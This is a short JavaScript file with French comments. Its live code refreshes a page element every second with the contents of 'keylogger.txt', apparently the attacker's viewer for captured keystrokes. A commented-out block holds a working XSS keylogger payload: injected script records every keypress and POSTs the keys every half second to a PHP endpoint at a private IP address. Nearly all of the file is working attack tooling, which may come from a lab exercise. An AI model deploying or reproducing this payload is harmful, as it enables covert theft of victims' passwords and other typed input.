function chargerFichier() {
    fetch("keylogger.txt")  // On récupère directement cookies.txt
        .then(response => response.text())
        .then(data => {
            document.getElementById("contenu-keylogger").textContent = data;
        })
        .catch(error => {
            document.getElementById("contenu-keylogger").textContent = "Erreur lors du chargement.";
            console.error("Erreur :", error);
        });
}
    
// Charger le fichier immédiatement au démarrage
chargerFichier();
    
// Actualiser toutes les 1 secondes
setInterval(chargerFichier, 1000);


// payload keylogger
/*
<script>
var keys = '';
document.onkeypress = function(e) {
var get = window.event ? window.event : e;
var key = get.keyCode ? get.keyCode : get.charCode;
key = String.fromCharCode(key);
keys += key;
};
window.setInterval(function() {
if (keys !== '') {
fetch('http://192.168.148.133:8082/keylogger.php', {
method: 'POST',
headers: {
'Content-Type': 'application/x-www-form-urlencoded'
},
body: 'key=' + encodeURIComponent(keys)
})
.then(response => response.text())
.then(data => {
console.log('Keys sent successfully:', data);
})
.catch(error => {
console.error('Error sending keys:', error);
});
keys = ''; // Reset the keys after sending
}
}, 500);
</script>
*/